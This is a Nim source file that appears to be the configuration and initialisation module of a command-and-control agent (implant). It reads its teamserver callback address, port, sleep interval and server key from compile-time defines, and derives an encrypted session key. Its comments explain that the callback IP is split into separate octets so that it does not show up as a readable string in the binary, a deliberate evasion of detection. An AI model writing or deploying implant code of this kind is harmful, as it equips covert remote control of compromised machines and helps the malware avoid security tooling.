import parsetoml, base64, system
import ../../common/[types, utils, crypto]

const ListenerUuid {.strdefine.}: string = ""
const Octet1 {.intdefine.}: int = 0
const Octet2 {.intdefine.}: int = 0
const Octet3 {.intdefine.}: int = 0
const Octet4 {.intdefine.}: int = 0
const ListenerPort {.intdefine.}: int = 5555
const SleepDelay {.intdefine.}: int = 10
const ServerPublicKey {.strdefine.}: string = ""
const ProfileString {.strdefine.}: string = ""

proc init*(T: type AgentCtx): AgentCtx = 

    try: 
        # The agent configuration is read at compile time using define/-d statements in nim.cfg
        # This configuration file can be dynamically generated from the teamserver management interface
        # Downside to this is obviously that readable strings, such as the listener UUID can be found in the binary
        when not (  defined(ListenerUuid) or 
                    defined(Octet1) or  
                    defined(Octet2) or
                    defined(Octet3) or
                    defined(Octet4) or
                    defined(ListenerPort) or
                    defined(SleepDelay) or
                    defined(ServerPublicKey) or 
                    defined(ProfilePath)):
            raise newException(CatchableError, "Missing agent configuration.")

        # Reconstruct IP address, which is split into integers to prevent it from showing up as a hardcoded-string in the binary
        let address = $Octet1 & "." & $Octet2 & "." & $Octet3 & "." & $Octet4 

        # Create agent configuration
        var agentKeyPair = generateKeyPair() 
        let serverPublicKey = decode(ServerPublicKey).toKey() 

        let ctx = AgentCtx(
            agentId: generateUUID(),
            listenerId: ListenerUuid,
            ip: address, 
            port: ListenerPort, 
            sleep: SleepDelay,
            sessionKey: deriveSessionKey(agentKeyPair, serverPublicKey),   # Perform key exchange to derive AES256 session key for encrypted communication
            agentPublicKey: agentKeyPair.publicKey,
            profile: parseString(decode(ProfileString))
        )

        # Cleanup agent's secret key
        wipeKey(agentKeyPair.privateKey)

        return ctx

    except CatchableError as err:
        echo "[-] " & err.msg
        return nil



